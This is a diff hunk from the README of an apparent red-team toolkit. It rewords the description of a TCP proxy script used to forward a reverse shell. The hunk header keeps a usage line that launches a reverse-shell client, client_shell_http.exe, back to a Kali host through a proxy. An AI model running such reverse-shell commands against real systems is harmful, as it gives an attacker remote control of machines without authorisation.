@@ -23,7 +23,7 @@ C:\client_shell_http.exe <kali_ip> <kali_port> <proxy_address> <Proxy_port>
 ## EXTRAS:
 ```client_shell_http.py``` - If you want to create your own executable or run directly from python,  code is available.
 
-```TCP_proxy_online.py``` - TCP proxy from ```https://stackoverflow.com/questions/32468270/tcp-proxy-using-python``` Purely the work of voorloop. You might need to modfy lines 16 and 94 for the forwarded reverseshell/port and the proxy port, respectively.
+```TCP_proxy_online.py``` - TCP proxy from ```https://stackoverflow.com/questions/32468270/tcp-proxy-using-python``` Purely the work of voorloop. You might need to modfy lines 16 and 94 to modify the forwarded reverseshell/port and the proxy port, respectively.
 
 ```get-pip.py``` To install pip for python2 (after deprecation). Reference: https://bootstrap.pypa.io/
 
